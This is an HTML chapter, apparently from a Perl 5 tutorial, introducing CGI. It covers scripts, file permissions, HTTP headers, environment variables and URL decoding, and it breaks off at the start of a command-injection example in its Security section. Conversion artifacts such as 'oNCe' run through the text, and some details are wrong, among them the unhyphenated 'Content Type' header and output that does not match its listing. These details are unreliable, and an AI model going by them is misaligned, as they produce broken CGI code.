<html>

<head>

<title>Chapter 19  -- What Is CGI?</title>



<meta>

</head>

<body TEXT="#000000" BGCOLOR="#FFFFFF" LINK="#0000EE" VLINK="#551A8B" ALINK="#CE2910">

<h1><font SIZE="6" COLOR="#FF0000">Chapter&nbsp;19</font></h1>

<h1><font SIZE="6" COLOR="#FF0000">What Is CGI?</font></h1>

<hr>

<p>

<center><b><font SIZE="5">CONTENTS</font></b></center>

<ul>

<li><a HREF="#WhyUsePerlforCGI">

Why Use Perl for CGI?</a>

<li><a HREF="#CGIAppsversusJavaApplets">

CGI Apps versus Java Applets</a>

<li><a HREF="#ShouldYouUseCGIModules">

Should You Use CGI Modules?</a>

<li><a HREF="#HowDoesCGIWork">

How Does CGI Work?</a>

<li><a HREF="#CallingYourCGIProgram">

Calling Your CGI Program</a>

<li><a HREF="#YourFirstCGIProgram">

Your First CGI Program</a>

<li><a HREF="#WhyAreFilePermissionsImportantinUNIX">

Why Are File Permissions Important in UNIX?</a>

<li><a HREF="#HTTPHeaders">

HTTP Headers</a>

<li><a HREF="#CGIandEnvironmentVariables">

CGI and Environment Variables</a>

<li><a HREF="#URLENCoding">

URL ENCoding</a>

<li><a HREF="#Security">

Security</a>

<li><a HREF="#CGIwrapandSecurity">

CGIwrap and Security</a>

<li><a HREF="#Cookies">

Cookies</a>

<ul>

<li><a HREF="#CookieSecurity">

Cookie Security</a>

<li><a HREF="#HowAreCookiesCreatedandRead">

How Are Cookies Created and Read?</a>

<li><a HREF="#CanaVisitorsBrowserSupportCookies">

Can a Visitor's Browser Support Cookies?</a>

</ul>

<li><a HREF="#DebuggingCGIPrograms">

Debugging CGI Programs</a>

<ul>

<li><a HREF="#SendingOutputtotheServersLogFile">

Sending Output to the Server's Log File</a>

<li><a HREF="#SendingSTDERRtotheWebBrowser">

Sending STDERR to the Web Browser</a>

<li><a HREF="#CGITap">

CGITap</a>

<li><a HREF="#GeneratinganErrorHTMLPage">

Generating an Error HTML Page</a>

</ul>

<li><a HREF="#Summary">

Summary</a>

<li><a HREF="#ReviewQuestions">

Review Questions</a>

<li><a HREF="#ReviewExercises">

Review Exercises</a>

</ul>



<hr>

<p>

CGI, or <i>Common Gateway Interface</i>, is the standard programming

interface between Web servers and external programs. It is one

of the most exciting and fun areas of programming today. The CGI

standard lets Web browsers pass information to programs written

in any language. If you want to create a lightning-fast search

engine, then your CGI program will most likely be written in C

or C++. However, most other applications can use Perl.

<p>

The CGI standard does not exist in isolation; it is dependent

on the HTML and HTTP standards. HTML is the standard that lets

Web browsers understand document content. HTTP is the communications

protocol that, among other things, lets Web servers talk with

Web browsers.<br>

<p>

<center>

<table BORDERCOLOR="#000000" BORDER="1" WIDTH="80%">

<tr><td><b>Note</b></td></tr>

<tr><td>

<blockquote>

If you are unfamiliar with HTML, you might want to skip to the HTML introduction in <a HREF="ch20.htm" tppabs="http://202.113.16.101/%7eeb%7e/Perl%205%20By%20Example/ch20.htm">Chapter 20</a>, &quot;Form Processing,&quot; before continuing. Otherwise, take the HTML refereNCes in this chapter at face value.</blockquote>



</td></tr>

</table>

</center>

<p>

<p>

Almost anyone can throw together some HTML and hang a &quot;home

page&quot; out on the Web. But most sites out there are, quite

frankly, boring. Why? The fact is that most sites are built as

a simple series of HTML documents that never change. The site

is completely static. No one is likely to visit a static page

more than oNCe or twice. Think about the sites you visit most

often. They probably have some interesting content, certainly,

but more importantly, they have dynamic content.

<p>

So what's a Webmaster to do? No Webmaster has the time to update

his or her Web site by hand every day. Fortunately, the people

who developed the Web protocol thought of this problem and gave

us CGI. CGI gives you a way to make Web sites dynamic and interactive.

<p>

Each word in the acronym Common Gateway Interface helps you to

understand the interface:

<ul>

<li><b>Common</b>-interacts with many different operating systems.

<li><b>Gateway</b>-provides users with a way to gain access to

different programs, such as databases or picture generators.

<li><b>Interface</b>-uses a well-defined method to interact with

a Web server.

</ul>

<p>

CGI applications can perform nearly any task that your imagination

can think up. For example, you can create Web pages on-the-fly,

access databases, hold telnet sessions, generate graphics, and

compile statistics.

<p>

The basic coNCept behind CGI is pretty simple; however, actually

creating CGI applications is not. That requires real programming

skills. You need to be able to debug programs and make logical

connections between one idea and another. You also need to have

the ability to visualize the application that you'd like to create.

This chapter and the next, &quot;Form Processing,&quot; will get

you started with CGI programming. If you plan to create large

applications, you might want to look at Que's <i>Special Edition

Using CGI</i>.

<h2><a NAME="WhyUsePerlforCGI"><font SIZE="5" COLOR="#FF0000">

Why Use Perl for CGI?</font></a></h2>

<p>

Perl is the de facto standard for CGI programming for a number

of reasons, but perhaps the most important are:

<ul>

<li><b>Socket Support</b>-create programs that interface seamlessly

with Internet protocols. Your CGI program can send a Web page

in response to a transaction and send a series of e-mail messages

to inform interested people that the transaction happened.

<li><b>Pattern Matching</b>-ideal for handling form data and searching

text.

<li><b>Flexible Text Handling</b>-no details to worry. The way

that Perl handles strings, in terms of memory allocation and deallocation,

fades into the background as you program. You simply can ignore

the details of coNCatenating, copying, and creating new strings.

</ul>

<p>

The advantage of an interpreted language in CGI applications is

its simplicity in development, debugging, and revision. By removing

the compilation step, you and I can move more quickly from task

to task, without the frustration that can sometimes arise from

debugging compiled programs. Of course, not any interpreted language

will do. Perl has the distiNCt advantage of having an extremely

rich and capable fuNCtionality.

<p>

There are some times when a mature CGI application should be ported

to C or another compiled language. These are the Web applications

where speed is important. If you expect to have a very active

site, you probably want to move to a compiled language because

they run faster.

<h2><a NAME="CGIAppsversusJavaApplets"><font SIZE="5" COLOR="#FF0000">

CGI Apps versus Java Applets</font></a></h2>

<p>

CGI and Java are two totally different animals. CGI is a specification

that can be used by any programming language. CGI applications

are run on a Web server. Java is a programming language that is

run on the client side.

<p>

CGI applications should be designed to take advantage of the centralized

nature of a Web server. They are great for searching databases,

processing HTML form data, and other applications that require

limited interaction with a user.

<p>

Java applications are good when you need a high degree of interaction

with users: for example, games or animation.

<p>

Java programs need to be kept relatively small because they are

transmitted through the Internet to the client. CGI applications,

on the other hand, can be as large as needed because they reside

and are executed on the Web server.

<p>

You can design your Web site to use both Java and CGI applications.

For example, you might want to use Java on the client side to

do field validation when collecting information on a form. Then

oNCe the input has been validated, the Java application can send

the information to a CGI application on the Web server where the

database resides.

<h2><a NAME="ShouldYouUseCGIModules"><font SIZE="5" COLOR="#FF0000">

Should You Use CGI Modules?</font></a></h2>

<p>

I eNCourage you to use the CGI modules that are available on the

Internet. The most up-to-date module that I know about is called

<tt>cgi.pm</tt>-but you must be using

Perl v5.002 or an even newer version in order to use it. <tt>cgi.pm</tt>

is very comprehensive and covers many different protocols in addition

to the basic CGI standard.

<p>

You might find that <tt>cgi.pm</tt>

is overkill for simple CGI applications. If so, look at <tt>cgi-lite.pl</tt>.

This library doesn't do as much as <tt>cgi.pm</tt>

but you'll probably find that it is easier to use.

<p>

You can find both of these scripts at one of the CPAN Web sites

that are mentioned in <a HREF="ch22.htm" tppabs="http://202.113.16.101/%7eeb%7e/Perl%205%20By%20Example/ch22.htm">Chapter 22</a>, &quot;Internet Resources.&quot;

<p>

However, in this book, I have purposely not used these scripts.

I feel it is important for you to understand the mechanisms behind

the protocols. This will make debugging your applications easier

because you'll have a better idea what the modules are doing behind

the scenes. You will also be able to make better use of pre-existing

modules if you can make educated guesses about what a poorly documented

fuNCtion does.

<h2><a NAME="HowDoesCGIWork"><font SIZE="5" COLOR="#FF0000">

How Does CGI Work?</font></a></h2>

<p>

CGI programs are always placed on a disk that the Web server has

access to. This means that if you are using a dial-up account

to maintain your Web site, you need to upload your CGI programs

to the server before they can be run.<br>

<p>

<center>

<table BORDERCOLOR="#000000" BORDER="1" WIDTH="80%">

<tr><td><b>Tip</b></td></tr>

<tr><td>

<blockquote>

You can test your scripts locally as long as you can use Perl on your local machine. See the &quot;Debugging&quot; section later in this chapter.</blockquote>



</td></tr>

</table>

</center>

<p>

<p>

Web servers are generally configured so that all CGI applications

are placed into a <tt>cgi-bin</tt>

directory. However, the Web server may have aliases so that &quot;virtual

directories&quot; exist. Each user might have his or her own <tt>cgi-bin</tt>

directory. The directory location is totally under the control

of your Web site administrator.<br>

<p>

<center>

<table BORDERCOLOR="#000000" BORDER="1" WIDTH="80%">

<tr><td><b>Tip</b></td></tr>

<tr><td>

<blockquote>

Finding out which directory your scripts need to be placed in is the first step in creating CGI programs. Because you need to get this information from your Web site administrator, send an e-mail message right now requesting this information. Also ask if 
there are any CGI restrictions or guidelines that you need to follow.</blockquote>



</td></tr>

</table>

</center>

<p>

<h2><a NAME="CallingYourCGIProgram"><font SIZE="5" COLOR="#FF0000">

Calling Your CGI Program</font></a></h2>

<p>

The easiest way to run a CGI program is to type in the URL of

the program into your Web browser. The Web server should recognize

that you are requesting a CGI program and execute it. For example,

if you already had a CGI program called <tt>test.pl</tt>

running on a local Web server, you could start it by entering

the following URL into your Web browser:

<blockquote>

<pre>

http://localhost/cgi-bin/test.pl

</pre>

</blockquote>

<p>

The Web server will execute your CGI script and any output is

displayed by your Web browser.

<p>

The URL for your CGI program is a <i>virtual</i> path. The actual

location of the script on the Web server depends on the configuration

of the server software and the type of computer being used. For

example, if your computer is running the Linux operating system

and the NCSA Web server in a &quot;standard&quot; configuration,

then the above virtual would translate into <tt>/usr/local/etc/httpd/cgi-bin/test.pl</tt>.

If you were running the Website server under Windows 95, the translated

path might be <tt>/website/cgi-shl/test.pl</tt>.

<p>

If you have installed and are administering the Web server yourself,

you probably know where to place your scripts. If you are using

a service provider's Web server, ask the server's administrator

where to put your scripts and how to refereNCe them from your

documents.

<p>

There are other ways to invoke CGI programs besides using a Web

browser to visit the URL. You can also start CGI programs from:

<ul>

<li>a hypertext link. For example:

</ul>

<blockquote>

<pre>

&lt;A HREF=&quot;cgi-bin/test.pl&quot;&gt;Click here to run a CGI program&lt;/A&gt;

</pre>

</blockquote>

<ul>

<li>a button on an HTML form. You can read more about HTML forms

in <a HREF="ch20.htm" tppabs="http://202.113.16.101/%7eeb%7e/Perl%205%20By%20Example/ch20.htm">Chapter 20</a>, &quot;Form Processing.&quot;

<li>a server-side iNClude. You can read more about server-side

iNCludes in <a HREF="ch20.htm" tppabs="http://202.113.16.101/%7eeb%7e/Perl%205%20By%20Example/ch20.htm">Chapter 20</a>, &quot;Form Processing.&quot;

</ul>

<p>

Interestingly enough, you can pass information to your CGI program

by adding extra information to the standard URL. If your CGI program

is used for searching your site, for example, you can pass some

information to specify which directory to search. The following

HTML hyperlink will invoke a search script and tell it to search

the <tt>/root/document</tt> directory.

<blockquote>

<pre>

&lt;A HREF=&quot;cgi-bin/search.pl/root/document&quot;&gt;Search the Document 

Directory &lt;A&gt;

</pre>

</blockquote>

<p>

This <i>extra</i> path information can be accessed through the

<tt>PATH_INFO</tt> environment variable.

<p>

You can also use a question mark to pass information to a CGI

program. Typically, a question mark indicates that you are passing

keywords that will be used in a search.

<blockquote>

<pre>

&lt;A HREF=&quot;cgi-bin/search.pl?Wine+1993&quot;&gt;Search for 1993 Wines&lt;/A&gt;

</pre>

</blockquote>

<p>

The information that follows the question mark will be available

to your CGI program through the <tt>QUERY_STRING</tt>

environment variables.

<p>

Using either of these approaches will let you create <i>canned</i>

CGI requests. By creating these requests ahead of time, you can

reduce the amount of typing errors that your users might otherwise

have. Later in this chapter, the &quot;CGI and Environment Variables&quot;

section discusses all of the environment variables you can use

inside CGI programs.<br>

<p>

<center>

<table BORDERCOLOR="#000000" BORDER="1" WIDTH="80%">

<tr><td><b>Note</b></td></tr>

<tr><td>

<blockquote>

Generally speaking, visitors to your Web site should never have to type in the URL for a CGI program. A hypertext link should always be provided to start the program.</blockquote>



</td></tr>

</table>

</center>

<p>

<h2><a NAME="YourFirstCGIProgram"><font SIZE="5" COLOR="#FF0000">

Your First CGI Program</font></a></h2>

<p>

You can use any text editor or word processor in the world to

create your CGI programs because they are simply Perl programs

that are invoked by a URL instead of the command line. Listing

19.1 contains a five-line CGI program-nearly the smallest program

you can have.

<p>

<img SRC="pseudo.gif" tppabs="http://202.113.16.101/%7eeb%7e/Perl%205%20By%20Example/pseudo.gif" BORDER="1" ALIGN="RIGHT" WIDTH="31" HEIGHT="34"><p>

<blockquote>

<i>Turn on the warning option.<br>

<i>Turn on the strict pragma.<br>

<i>Send the HTTP header to the Web browser.<br>

<i>Send a line of text to the Web browser.</i></i></i></i>

</blockquote>

<hr>

<blockquote>

<b>Listing 19.1&nbsp;&nbsp;19LST01.PL-A Very Small CGI Program

<br>

</b>

</blockquote>

<blockquote>

<pre>

#!/usr/local/bin/perl -w

use strict;



print &quot;Content-type: text/plain\n\n&quot;;

print &quot;Hello, World.\n&quot;;

</pre>

</blockquote>

<hr>

<p>

The file that contains this CGI program should be placed in your

Web server's <tt>cgi-bin</tt> directory.

Then, the URL for this program will be something like <tt>http://localhost/cgi-bin/test.pl</tt>

(change localhost to correspond to your Web server's hostname).

Enter this URL into your Web browser and it should display a Web

page saying &quot;This is a test.&quot;<br>

<p>

<center>

<table BORDERCOLOR="#000000" BORDER="1" WIDTH="80%">

<tr><td><b>Note</b></td></tr>

<tr><td>

<blockquote>

You may wonder how the Web server knows that a CGI program should be executed instead of being displayed. This is an excellent question. It can be best answered by referring to the documentation that came with your particular server.</blockquote>



</td></tr>

</table>

</center>

<p>

<p>

When the Web server executes your CGI program, it automatically

opens the <tt>STDIN</tt>, <tt>STDOUT</tt>,

and <tt>STDERR </tt>file handles for

you.

<ul>

<li><tt><b><font FACE="Courier">STDIN</font></b></tt>-The standard

input of your CGI program might contain information that was generated

by an HTML form. Otherwise, you shouldn't use STDIN. See &quot;Inputs

to Your CGI Program&quot; later in this chapter for more information.

<li><tt><b><font FACE="Courier">STDOUT</font></b></tt>-The standard

output of your CGI program is linked to the <tt>STDIN</tt>

of the Web browser. This means that when you print information

using the <tt>print()</tt> fuNCtion,

you are essentially writing directly to the Web browser's window.

This link will be discussed further in the &quot;HTTP Headers&quot;

section later in this chapter.

<li><tt><b><font FACE="Courier">STDERR</font></b></tt>-The standard

output of your CGI program is linked to the Web server's log file.

This is very useful when you are debugging your program. Any output

from the <tt>die()</tt> or <tt>warn()</tt>

fuNCtion will be placed into the server's log file. The STDERR

file handle is discussed further in the &quot;Debugging CGI Programs&quot;

section later in this chapter.

</ul>

<p>

The Web server will also make some information available to your

CGI program through environment variables. You may recall the

<tt>%ENV</tt> hash from <a HREF="ch12.htm" tppabs="http://202.113.16.101/%7eeb%7e/Perl%205%20By%20Example/ch12.htm">Chapter 12</a>,

&quot;Using Special Variables.&quot; Details about the environment

variables you can use can be found in the &quot;Environment Variables&quot;

section later in this chapter.

<h2><a NAME="WhyAreFilePermissionsImportantinUNIX"><font SIZE="5" COLOR="#FF0000">

Why Are File Permissions Important in UNIX?</font></a></h2>

<p>

File permission controls can access files in UNIX systems. Quite

often, I hear of beginning CGI programmers who try to write files

into a directory in which they do not have write permission. UNIX

permissions are also called <i>rights</i>.

<p>

UNIX can control file access in a number of ways. There are three

levels of permissions for three classes of users. To view the

permissions on a file use the <tt>ls<i> </i></tt>command

with the <tt>-l</tt> command-line

option. For example:

<blockquote>

<pre>

C:indyunix:~/public_html/pfind&gt;<b>ls -l

</b>total 40

-rw-r--r--   1 dbewley  staff        139 Jun 18 14:14 home.html

-rwxr-xr-x   1 dbewley  staff       9145 Aug 14 07:06 pfind

drwxr-xr--   2 dbewley  staff        512 Aug 15 07:11 tmp

</pre>

</blockquote>

<p>

Each line of this listing indicates a separate directory entry.

The first character of the first column is normally either a dash

or the letter <tt>d</tt>. If a directory

entry has a <tt>d</tt>, it means that

the entry is a subdirectory of the current directory.

<p>

The other nine characters are the file permissions. Permissions

should be thought of in groups of three, for the three classes

of user. The three classes of user are:

<ul>

<li><b>user</b>-the owner of the file or directory. The owner's

name is displayed in the third column of the <tt>ls</tt>

command's output.

<li><b>group</b>-the group that owns the file. Files can have

both individual owners and a group. Several users can belong to

a single group.

<li><b>others</b>-any user that is not the owner or in the group

that owns the file.

</ul>

<p>

Each of the classes can have one or more of the following three

levels of permission:

<ul>

<li><b>r</b>-the class can read the file or directory.

<li><b>w</b>-the class can write to the file or directory.

<li><b>x</b>-the class can execute the file or list the directory.

</ul>

<p>

If a permission is not allowed to the user that ran the <tt>ls</tt>

command, its position is filled with a dash. For example:

<blockquote>

<pre>

<b>ls -l hform.html

</font></b><font SIZE="2" FACE="Courier">-rwx------   1 dbewley  staff      11816 May  9 09:19 slideshow.pl

</pre>

</blockquote>

<p>

The owner, <tt>dbewley</tt>, has full

rights - read, write, and execute for this file. The group, staff,

and everyone else have no rights.<br>

<p>

<center>

<table BORDERCOLOR="#000000" BORDER="1" WIDTH="80%">

<tr><td><b>Tip</b></td></tr>

<tr><td>

<blockquote>

Perl scripts are not compiled; they must be read by the Perl interpreter each time they are run. Therefore, Perl scripts, unlike compiled programs, must have execute <font FACE="LI Helvetica Light Oblique">and</font> read permissions.

</blockquote>



</td></tr>

</table>

</center>

<p>

<p>

Here is another example:

<blockquote>

<pre>

<b>ls -l pfind.pl

</font></b><font SIZE="2" FACE="Courier">-rwxr-x--   1 dbewley  staff       2863 Oct 10 1995  pfind.pl

</pre>

</blockquote>

<p>

This time, the owner has full access while the group staff can

read and execute the file. All others have no rights to this file.

<p>

Most HTML files will have permissions that look like this:

<blockquote>

<pre>

<b>ls -l schedule.html

</font></b><font SIZE="2" FACE="Courier">-rw-r--r--   1 dbewley  staff       2439 Feb  8 1996  schedule.html

</pre>

</blockquote>

<p>

Everyone can read it, but only the user can modify or delete it.

There is no need to have execute permission siNCe HTML is not

an executable language.

<p>

You can change the permissions on a file by using the <tt>chmod</tt>

command. The <tt>chmod</tt> command

recognizes the three classes of user as <tt>u</tt>,

<tt>g</tt>, and <tt>o</tt>

and the three levels of permissions as <tt>r</tt>,

<tt>w</tt>, and <tt>x</tt>.

It grants and revokes permissions with a <tt>+</tt>

or <tt>-</tt> in conjuNCtion with

each permission that you want to change. It also will accept an

<tt>a</tt> for all three classes of

users at oNCe.

<p>

The syntax of the <tt>chmod</tt> command

is:

<blockquote>

<pre>

chmod &lt;options&gt; &lt;file&gt;

</pre>

</blockquote>

<p>

Here are some examples of the <tt>chmod</tt>

command in action

<blockquote>

<pre>

<b>ls -l pfind.pl

</font></b><font SIZE="2" FACE="Courier">-rw------   1 dbewley  staff       2863 Oct 10 1995  pfind.pl

<b>chmod u+x pfind.pl

ls -l pfind.pl

</b>-rwx------   1 dbewley  staff       2863 Oct 10 1995  pfind.pl

</pre>

</blockquote>

<p>

The first <tt>ls</tt> command shows

you the original file permissions. Then, the <tt>chmod</tt>

command add execute permission for the owner (or user) of <tt>pfind.pl</tt>.

The second <tt>ls</tt> command displays

the newly changed permissions.

<p>

To add these permissions for both the group and other classes,

use <tt>go+rx</tt> as in the following

example. Remember, users must have at least read and execute permissions

to run Perl scripts.

<blockquote>

<pre>

<b>ls -l pfind.pl

</font></b><font SIZE="2" FACE="Courier">-rwx------   1 dbewley  staff       2863 Oct 10 1995  pfind.pl

<b>chmod go+rx pfind.pl

ls -l pfind.pl

</b>-rwxr-xr-x   1 dbewley  staff       2863 Oct 10 1995  pfind.pl

</pre>

</blockquote>

<p>

Now, any user can read and execute <tt>pfind.pl</tt>.

Let's say a serious bug was found in pfind.pl and we don't want

it to be executed by anyone. To revoke execute permission for

all classes of users, use the <tt>a-x</tt>

option with the <tt>chmod</tt> command.

<blockquote>

<pre>

<b>ls -l pfind.pl

</font></b><font SIZE="2" FACE="Courier">-rwxr-xr-x   1 dbewley  staff       2863 Oct 10 1995  pfind.pl

<b>chmod a-x pfind.pl

ls -l pfind.pl

</b>-rw-r--r--   1 dbewley  staff       2863 Oct 10 1995  pfind.pl

</pre>

</blockquote>

<p>

Now, all users can read <tt>pfind.pl</tt>,

but no one can execute it.

<h2><a NAME="HTTPHeaders"><font SIZE="5" COLOR="#FF0000">

HTTP Headers</font></a></h2>

<p>

The first line of output for most CGI programs must be an HTTP

header that tells the client Web browser what type of output it

is sending back via <tt>STDOUT</tt>.

Only scripts that are called from a server-side iNClude are exempt

from this requirement.<br>

<p>

<center><b>Table 19.1&nbsp;&nbsp;A List of HTTP Headers</b></center>

<p>

<center>

<table BORDERCOLOR="#000000" BORDER="1" WIDTH="80%">

<tr><td WIDTH="166"><i>Response Type</i></td><td WIDTH="238"><i>HTTP Header</i>

</td></tr>

<tr><td WIDTH="166">Text</td><td WIDTH="238">Content Type: text/plain

</td></tr>

<tr><td WIDTH="166">HTML page</td><td WIDTH="238">Content Type: text/html

</td></tr>

<tr><td WIDTH="166">Gif graphic</td><td WIDTH="238">Content Type: image/gif

</td></tr>

<tr><td WIDTH="166">Redirection to another Web page</td><td WIDTH="238">Location: http://www.foobar.com

</td></tr>

<tr><td WIDTH="166">Cookie</td><td WIDTH="238">Set-cookie: ...</td>

</tr>

<tr><td WIDTH="166">Error Message</td><td WIDTH="238">Status: 402 

</td></tr>

</table>

</center>

<p>

<p>

All HTTP headers must be followed by a blank line. Use the following

line of code as a template:

<blockquote>

<pre>

print(&quot;Content Type: text/html\n\n&quot;);

</pre>

</blockquote>

<p>

Notice that the HTTP header is followed by <i>two</i> newline

characters. This is very important. It ensures that a blank line

will always follow the HTTP header.

<p>

If you have installed any helper applications for Netscape or

are familiar with MIME types, you already recognize the <tt>text/plain</tt>

and <tt>text/html</tt> parts of the

<tt>Content Type</tt> header. They

tell the remote Web browser what type of information you are sending.

The two most common MIME types to use are <tt>text/plain</tt>

and <tt>text/html</tt>.

<p>

The <tt>Location</tt> header is used

to redirect the client Web browser to another Web page. For example,

let's say that your CGI script is designed to randomly choose

from among 10 different URLs in  order to determine the next Web

page to display. ONCe the new Web page is chosen, your program

outputs it like this:

<blockquote>

<pre>

print(&quot;Location: $nextPage\n\n&quot;);

</pre>

</blockquote>

<p>

ONCe the <tt>Location</tt> header

has been printed, nothing else should be printed. That is all

the information that the client Web browser needs.

<p>

Cookies and the <tt>Set-cookie:</tt>

header are discussed in the &quot;Cookies&quot; section later

in this chapter.

<p>

The last type of HTTP header is the <tt>Status</tt>

header. This header should be sent when an error arises in your

script that your program is not equipped to handle. I feel that

this HTTP header should not be used unless you are under severe

time pressure to complete a project. You should try to create

your own error handling routines that display a full Web page

that explains the error that happened and what the user can do

to fix or circumvent it. You might iNClude the time, date, type

of error, contact names and phone numbers, and any other information

that might be useful to the user. Relying on the standard error

messages of the Web server and browser will make your Web site

less user friendly.

<h2><a NAME="CGIandEnvironmentVariables"><font SIZE="5" COLOR="#FF0000">

CGI and Environment Variables</font></a></h2>

<p>

You are already familiar with environment variables if you read

<a HREF="ch12.htm" tppabs="http://202.113.16.101/%7eeb%7e/Perl%205%20By%20Example/ch12.htm">Chapter 12</a>, &quot;Using Special Variables.&quot; When your CGI

program is started, the Web server creates and initializes a number

of environment variables that your program can access using the

<tt>%ENV</tt> hash.

<p>

Table 19.2 contains a short description of each environment variable.

A complete description of the environmental variables used in

CGI programs can be found at

<blockquote>

<pre>

http://www.ast.cam.ac.uk/~drtr/cgi-spec.html

<br>



</pre>

</blockquote>

<p>

<center><b>Table 19.2&nbsp;&nbsp;CGI Environment Variables</b></center>

<p>

<center>

<table BORDERCOLOR="#000000" BORDER="1" WIDTH="80%">

<tr><td WIDTH="199"><i>Variable Name</i></td><td WIDTH="391"><i>Description</i>

</td></tr>

<tr><td WIDTH="199">AUTH_TYPE</td><td WIDTH="391">Optionally provides the authentication protocol used to access your script if the local Web server supports authentication and if  authentication was used to access your script.

</td></tr>

<tr><td WIDTH="199">CONTENT_LENGTH</td><td WIDTH="391">Optionally provides the length, in bytes, of the content provided to the script through the <tt>STDIN </tt>file handle. Used particularly in the <tt>POST</tt> method of form processing. See <a HREF="ch20.htm" tppabs="http://202.113.16.101/%7eeb%7e/Perl%205%20By%20Example/ch20.htm">Chapter 20</a>, &quot;Form Processing,&quot; for more information.

</td></tr>

<tr><td WIDTH="199">CONTENT_TYPE</td><td WIDTH="391">Optionally provides the type of content available from the <tt>STDIN</tt> file handle. This is used for the <tt>POST</tt> method of form processing. Most of the time, this variable will be blank and you can 
assume a value of <tt>application/octet-stream</tt>. 

</td></tr>

<tr><td WIDTH="199">GATEWAY_INTERFACE</td><td WIDTH="391">Provides the version of CGI supported by the local Web server. Most of the time, this will be equal to <tt>CGI/1.1</tt>.

</td></tr>

<tr><td WIDTH="199">HTTP_AccEPT</td><td WIDTH="391">Provides a comma-separated list of MIME types the browser software will accept. You might check this environmental variable to see if the client will accept a certain kind of graphic file.

</td></tr>

<tr><td WIDTH="199">HTTP_FORM</td><td WIDTH="391">Provides the user's e-mail address. Not all Web browsers will supply this information to your server. Therefore, use this field only to provide a default value for an HTML form.

</td></tr>

<tr><td WIDTH="199">HTTP_USER_AGENT</td><td WIDTH="391">Provides the type and version of the user's Web browser. For example, the Netscape Web browser is called Mozilla.

</td></tr>

<tr><td WIDTH="199">PATH_INFO</td><td WIDTH="391">Optionally contains any extra path information from the HTTP request that invoked the script.

</td></tr>

<tr><td WIDTH="199">PATH_TRANSLATED</td><td WIDTH="391">Maps the script's virtual path (i.e., from the root of the server directory) to the physical path used to call the script.

</td></tr>

<tr><td WIDTH="199">QUERY_STRING</td><td WIDTH="391">Optionally contains form information when the GET method of form processing is used. QUERY_STRING is also used for passing information such as search keywords to CGI scripts.

</td></tr>

<tr><td WIDTH="199">REMOTE_ADDR</td><td WIDTH="391">Contains the dotted decimal address of the user.

</td></tr>

<tr><td WIDTH="199">REMOTE_HOST</td><td WIDTH="391">Optionally provides the domain name for the site that the user has connected from.

</td></tr>

<tr><td WIDTH="199">REMOTE_IDENT</td><td WIDTH="391">Optionally provides client identification when your local server has contacted an IDENTD server on a client machine. You will very rarely see this because the IDENTD query is slow.

</td></tr>

<tr><td WIDTH="199">REMOTE_USER</td><td WIDTH="391">Optionally provides the name used by the user to access your secured script. 

</td></tr>

<tr><td WIDTH="199">REQUEST_METHOD</td><td WIDTH="391">Usually contains either &quot;GET&quot; or &quot;POST&quot;-the method by which form information will be made available to your script. See <a HREF="ch20.htm" tppabs="http://202.113.16.101/%7eeb%7e/Perl%205%20By%20Example/ch20.htm">Chapter 20</a>, &quot;Form Processing,&quot; 
for more information.

</td></tr>

<tr><td WIDTH="199">SCRIPT_NAME</td><td WIDTH="391">Contains the virtual path to the script.

</td></tr>

<tr><td WIDTH="199">SERVER_NAME</td><td WIDTH="391">Contains the configured hostname for the server.

</td></tr>

<tr><td WIDTH="199">SERVER_PORT</td><td WIDTH="391">Contains the port number that the local Web server software is listening on. The standard port number is 80.

</td></tr>

<tr><td WIDTH="199">SERVER_PROTOCOL</td><td WIDTH="391">Contains the version of the Web protocol this server uses. For example, <tt>HTTP/1.0</tt>.

</td></tr>

<tr><td WIDTH="199">SERVER_SOFTWARE</td><td WIDTH="391">Contains the name and version of the Web server software. For example, <tt>WebSite/1.1e</tt>.

</td></tr>

</table>

</center>

<p>

<h2><a NAME="URLENCoding"><font SIZE="5" COLOR="#FF0000">

URL ENCoding</font></a></h2>

<p>

One of the limitations that the WWW organizations have placed

on the HTTP protocol is that the content of the commands, responses,

and data that are passed between client and server should be clearly

defined. It is sometimes difficult to tell simply from the context

whether a space character is a field delimiter or an actual space

character to add whitespace between two words.

<p>

To clear up the ambiguity, the URL eNCoding scheme was created.

Any spaces are converted into plus (<tt>+</tt>)

signs to avoid semantic ambiguities. In addition, special characters

or 8-bit values are converted into their hexadecimal equivalents

and prefaced with  a percent sign (<tt>%</tt>).

For example, the string <tt>Davy Jones &lt;dj@planet.net&gt;</tt>

is eNCoded as <tt>Davy+Jones+%3Cdj@planet.net%3E</tt>.

If you look closely, you see that the <tt>&lt;</tt>

character has been converted to <tt>%3C</tt>

and the <tt>&gt;</tt> character has

been coverted to <tt>%3E</tt>.

<p>

Your CGI script will need to be able to convert URL eNCoded information

back into its normal form. Fortunately, Listing 19.2 contains

a fuNCtion that will convert URL eNCoded.

<p>

<img SRC="pseudo.gif" tppabs="http://202.113.16.101/%7eeb%7e/Perl%205%20By%20Example/pseudo.gif" BORDER="1" ALIGN="RIGHT" WIDTH="31" HEIGHT="34"><p>

<blockquote>

<i>Define the </i><tt><i>decodeURL()</i></tt><i>

fuNCtion.<br>

Get the eNCoded string from the parameter array.<br>

Translate all plus signs into spaces.<br>

Convert character coded as hexadecimal digits into regular characters.

<br>

Return the decoded string.</i>

</blockquote>

<hr>

<blockquote>

<b>Listing 19.2&nbsp;&nbsp;19LST02.PL-How to Decode the URL ENCoding

<br>

</b>

</blockquote>

<blockquote>

<pre>

sub decodeURL {

    $_ = shift;

    tr/+/ /;

    s/%(..)/pack('c', hex($1))/eg;

    return($_);

}

</pre>

</blockquote>

<hr>

<p>

This fuNCtion will be used in <a HREF="ch20.htm" tppabs="http://202.113.16.101/%7eeb%7e/Perl%205%20By%20Example/ch20.htm">Chapter 20</a>, &quot;Form Processing,&quot;

to decode form information. It is presented here because canned

queries also use URL eNCoding.

<h2><a NAME="Security"><font SIZE="5" COLOR="#FF0000">

Security</font></a></h2>

<p>

CGI really has only one large security hole that I can see. If

you pass information that came from a remote site to an operating

system command, you are asking for trouble. I think an example

is needed to understand the problem because it is not obvious.

<p>

Suppose that you had a CGI script that formatted a directory listing

and generated a Web page that let visitors view the listing. In

addition, let's say that the name of the directory to display

was passed to your program using the <tt>PATH_INFO</tt>

environment variable. The following URL could be used to call

your program:

<blockquote>

<pre>

http://www.foo.com/cgi-bin/dirlist.pl/docs

</pre>

</blockquote>

<p>

Inside your program, the <tt>PATH_INFO</tt>

environment variable is set to <tt>docs</tt>.

In order to get the directory listing, all that is needed is a

call to the <tt>ls</tt> command in

UNIX or the <tt>dir</tt> command in

DOS. Everything looks good, right?

<p>

But what if the program was invoked with this command line?

<blockquote>

<pre>

